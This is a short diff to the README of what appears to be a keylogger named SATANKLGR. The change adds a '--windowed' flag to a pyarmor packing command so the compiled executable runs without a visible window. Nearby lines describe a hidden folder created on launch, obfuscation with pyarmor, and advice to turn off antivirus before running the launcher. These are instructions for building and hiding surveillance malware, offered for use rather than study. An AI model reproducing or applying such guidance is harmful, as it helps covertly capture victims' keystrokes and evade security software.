@@ -58,7 +58,7 @@ When you launch compiled ```startup.exe``` it authomatically creates a [hidden f
 and pyarmor. 
 
 - It is possible to run SATANKLGR on Linux, however you will get only .py file with source code. Afterwards you can go to Windows and compile file to .exe using 
-```pyarmor pack --clean -e "--onefile --icon default.ico" SATANKLGR.py```
+```pyarmor pack --clean -e "--onefile --windowed --icon default.ico" SATANKLGR.py```
 
 - If you have an antivirus, turn it off when you launch the ```launcher.py```
 
